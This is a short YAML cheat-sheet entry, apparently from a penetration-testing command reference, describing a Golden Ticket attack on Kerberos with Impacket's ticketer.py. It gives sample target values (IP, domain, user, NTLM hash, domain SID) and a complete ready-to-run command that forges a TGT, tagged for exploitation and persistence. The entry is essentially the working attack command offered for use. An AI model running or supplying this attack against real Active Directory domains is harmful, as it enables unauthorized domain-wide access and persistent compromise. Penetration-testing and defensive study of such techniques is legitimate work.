---
description: |
  Impacket's ticketer.py can perform Golden Ticket attacks, which crafts a valid TGT ticket using a valid user's NTLM hash. It is then possible to access any service using the TGT by requesting a TGS for that service.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Hash: b18b4b218eccad1c223306ea1916885f

  	Domain SID: S-1-5-21-1339291983-1349129144-367733775

command: |
  python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 john
items:
  - Username
  - Hash
services:
  - Kerberos
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
  - Persistence
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py
  - https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
---
